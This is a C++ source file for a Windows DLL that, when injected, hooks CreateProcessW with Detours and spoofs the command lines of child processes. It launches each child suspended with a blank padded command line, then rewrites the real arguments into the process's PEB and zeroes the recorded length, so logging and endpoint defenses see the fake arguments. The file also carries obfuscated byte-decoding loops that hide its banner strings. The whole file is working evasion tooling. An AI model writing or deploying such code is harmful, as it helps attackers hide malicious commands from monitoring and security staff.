#include "pch.h"
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include "detours.h"
#pragma comment (lib, "detours.lib")
#pragma warning (disable:4996)

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
    HANDLE           ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID            ProcessInformation,
    ULONG            ProcessInformationLength,
    PULONG           ReturnLength
    );


BOOL ReadFromTargetProcess(HANDLE hProcess, PVOID pAddress, PVOID* ppReadBuffer, DWORD dwBufferSize) {
    SIZE_T sNmbrOfBytesRead = NULL;
    *ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);
    if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNmbrOfBytesRead) || sNmbrOfBytesRead != dwBufferSize) {
        return FALSE;
    }
    return TRUE;
}


BOOL WriteToTargetProcess(HANDLE hProcess, PVOID pAddressToWriteTo, PVOID pBuffer, DWORD dwBufferSize) {
    SIZE_T sNmbrOfBytesWritten = NULL;
    if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize) {
        return FALSE;
    }
    return TRUE;
}


typedef BOOL(WINAPI* CREATEPROCESSW)(
    LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
    BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

CREATEPROCESSW OriginalCreateProcessW = NULL;

BOOL WINAPI MyCreateProcessW(LPCWSTR lpApplicationName, LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation) {

    NTSTATUS						STATUS = NULL;

    WCHAR							szProcess[MAX_PATH];

    STARTUPINFOW					Si = { 0 };
    PROCESS_INFORMATION				Pi = { 0 };

    PROCESS_BASIC_INFORMATION		PBI = { 0 };
    ULONG							uRetern = NULL;

    PPEB							pPeb = NULL;
    PRTL_USER_PROCESS_PARAMETERS	pParms = NULL;

    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    Si.cb = sizeof(STARTUPINFOW);

    fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess");
    if (pNtQueryInformationProcess == NULL)
        return FALSE;

    wchar_t whichShell[4096];
    int length = wcslen(lpCommandLine);


    int tokenLength = 0;
    while (lpCommandLine[tokenLength] != L' ' && lpCommandLine[tokenLength] != L'\0') {
        tokenLength++;
    }

    wcsncpy(whichShell, lpCommandLine, tokenLength);
    whichShell[tokenLength] = L'\0'; 
    wchar_t cmdWithSpaces[4096]; 
    swprintf(cmdWithSpaces, sizeof(cmdWithSpaces) / sizeof(wchar_t), whichShell);
    for (int i = 0; i < length; ++i) {
        wcscat(cmdWithSpaces, L" ");
    }
    AttachConsole(-1);

    if (!OriginalCreateProcessW(
        NULL,
        cmdWithSpaces,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &Si,
        &Pi)) {
        return FALSE;
    }

    if ((STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &uRetern)) != 0) {
        return FALSE;
    }

    if (!ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, reinterpret_cast<PVOID*>(&pPeb), sizeof(PEB))) {
        return FALSE;
    }

    if (!ReadFromTargetProcess(Pi.hProcess, pPeb->ProcessParameters, reinterpret_cast<PVOID*>(&pParms), sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
        return FALSE;
    }
    
    if (!WriteToTargetProcess(Pi.hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)lpCommandLine, (DWORD)(lstrlenW(lpCommandLine) * sizeof(WCHAR) + 1))) {
        return FALSE;
    }
    else
    {
        printf("\n[i] Argument Spoofed.\n");
        fflush(stdout);
    }

    DWORD dwNewLen = 0;
    if (!WriteToTargetProcess(Pi.hProcess, ((PBYTE)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&dwNewLen, sizeof(DWORD))) {
        return FALSE;
    }

    printf("\n");
    ResumeThread(Pi.hThread);
    WaitForSingleObject(Pi.hThread, INFINITE);




    CloseHandle(Pi.hProcess);
    CloseHandle(Pi.hThread);
}

void printAscii() {

    unsigned char GBAkZ[] =
    {

        0x8f, 0x4a, 0x9b, 0x4, 0xfd, 0x2d, 0x74, 0x52,
        0x23, 0x5a, 0x10, 0xd0, 0x1f, 0x79, 0xfb, 0x35,
        0x49, 0xf6, 0x7c, 0xea, 0xa4, 0x1c, 0xcf, 0xec
    };

    for (unsigned int iwBC = 0; iwBC < sizeof(GBAkZ); ++iwBC)
    {
        unsigned char RBz = GBAkZ[iwBC];
        RBz ^= iwBC;
        RBz += 0xff;
        RBz = ~RBz;
        RBz += iwBC;
        RBz ^= iwBC;
        RBz -= iwBC;
        RBz = -RBz;
        RBz += iwBC;
        RBz = (RBz >> 0x3) | (RBz << 0x5);
        RBz ^= iwBC;
        RBz = ~RBz;
        RBz ^= iwBC;
        RBz = -RBz;
        RBz ^= iwBC;
        RBz = (RBz >> 0x7) | (RBz << 0x1);
        RBz = -RBz;
        RBz += iwBC;
        RBz ^= iwBC;
        RBz -= iwBC;
        RBz ^= iwBC;
        RBz = ~RBz;
        RBz += 0x1e;
        RBz = ~RBz;
        RBz -= iwBC;
        RBz ^= 0x30;
        RBz -= iwBC;
        RBz = (RBz >> 0x1) | (RBz << 0x7);
        RBz ^= 0x68;
        RBz += 0x77;
        RBz = -RBz;
        RBz ^= 0x5b;
        RBz -= iwBC;
        RBz ^= 0x90;
        RBz += iwBC;
        RBz ^= iwBC;
        RBz = (RBz >> 0x2) | (RBz << 0x6);
        RBz ^= 0xc;
        RBz -= 0x9f;
        RBz = ~RBz;
        RBz -= iwBC;
        RBz ^= 0xc9;
        RBz = ~RBz;
        RBz ^= iwBC;
        RBz -= iwBC;
        RBz = ~RBz;
        RBz -= iwBC;
        RBz = ~RBz;
        RBz += iwBC;
        RBz = ~RBz;
        RBz ^= iwBC;
        GBAkZ[iwBC] = RBz;
    }

    printf("\n\n             %s\n\n", GBAkZ);
    puts(
        "         CCCCB                                         \n"
        "         CCCCCCB                                       \n"
        "          CCCCCCCC        CCCCCCC                      \n"
        "            CCCCCCCB     CCCCCCCCCCCCC                 \n"
        "             CCCCCCCHSTTTODCCCCCCCCCCCCCCC             \n"
        "           BCCCCCCCCCCMTTTTTTTTTRMEDCCCCCCCC           \n"
        "         CCCCCCCGMCCCCCDLPOOOPRTTTTTSPHCCCCCCC         \n"
        "       CCCCCCDLSTTTMDCCCCDKNNNNNPSTTTTTTMECCCCCC       \n"
        "      CCCCCCNTTTTTTTTJCCCCCDLNNNNOTTTTTTTTOCCCCCCB     \n"
        "    BCCCCCITTTTTTTTTRNMGCCCCCFMNNNRTTTTTTTTTJCCCCCB    \n"
        "    BCCCCCJTTTTTTTTTRNNNMFCCCCCGMNRTTTTTTTTTJCCCCCC    \n"
        "     CCCCCCCNTTTTTTTTONNNNLDCCCCCITTTTTTTTODCCCCCC     \n"
        "       CCCCCCEMTTTTTTSPNNNNNKDCCCCCMTTTTTRCCCCCC       \n"
        "         CCCCCCCGPSTTTTTROONOOLDCCCCCPTTTSDCCC         \n"
        "           CCCCCCCCDFMRTTTTTTTTSKCCCCCEQT              \n"
        "             CCCCCCCCCCCCCCCCCCCCCCCCCCCC              \n"
        "                 CCCCCCCCCCCCCCCCCCCCCCCCCC            \n"
        "                      BCCCCCCCCCC    CCCCCCCC          \n"
        "                                       CCCCCCC         \n"
        "                                         BCCCC         \n"
    );
    unsigned char Bpr[] =
    {

        0xc8, 0xfe, 0x6b, 0x21, 0xa, 0x5, 0xdb, 0x2c,
        0x4f, 0x3c, 0x7f, 0x94, 0xc2, 0x6b, 0xbd, 0xc0,
        0xed, 0x6, 0x47, 0x3, 0xba, 0x29
    };

    for (unsigned int WMw = 0; WMw < sizeof(Bpr); ++WMw)
    {
        unsigned char CPf = Bpr[WMw];
        CPf -= WMw;
        CPf = ~CPf;
        CPf = -CPf;
        CPf -= 0x6a;
        CPf = -CPf;
        CPf -= WMw;
        CPf = (CPf >> 0x6) | (CPf << 0x2);
        CPf = -CPf;
        CPf ^= WMw;
        CPf = (CPf >> 0x5) | (CPf << 0x3);
        CPf += 0x7;
        CPf = ~CPf;
        CPf += 0xeb;
        CPf ^= 0x62;
        CPf = (CPf >> 0x2) | (CPf << 0x6);
        CPf -= 0x3b;
        CPf = -CPf;
        CPf -= 0x90;
        CPf = ~CPf;
        CPf += WMw;
        CPf = ~CPf;
        CPf += WMw;
        CPf ^= WMw;
        CPf -= 0xce;
        CPf ^= WMw;
        CPf += WMw;
        CPf = ~CPf;
        CPf -= 0xa4;
        CPf ^= 0x9c;
        CPf += WMw;
        CPf = ~CPf;
        CPf -= WMw;
        CPf = (CPf >> 0x2) | (CPf << 0x6);
        CPf = -CPf;
        CPf += WMw;
        CPf ^= 0x86;
        CPf = (CPf >> 0x6) | (CPf << 0x2);
        CPf ^= 0x93;
        CPf -= 0xea;
        CPf = (CPf >> 0x5) | (CPf << 0x3);
        CPf = ~CPf;
        CPf = (CPf >> 0x3) | (CPf << 0x5);
        CPf = -CPf;
        CPf ^= WMw;
        CPf = (CPf >> 0x6) | (CPf << 0x2);
        CPf -= 0xc0;
        CPf ^= WMw;
        CPf -= WMw;
        CPf ^= WMw;
        CPf = (CPf >> 0x1) | (CPf << 0x7);
        Bpr[WMw] = CPf;
    }

    printf("\n             %s\n", Bpr);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        
        printAscii();
        fflush(stdin);
        fflush(stdout);
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        OriginalCreateProcessW = CreateProcessW;
        DetourAttach((PVOID*)&OriginalCreateProcessW, MyCreateProcessW);
        DetourTransactionCommit();
        break;

    case DLL_PROCESS_DETACH:
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach((PVOID*)&OriginalCreateProcessW, MyCreateProcessW);
        DetourTransactionCommit();
        break;
    }
    return TRUE;
}
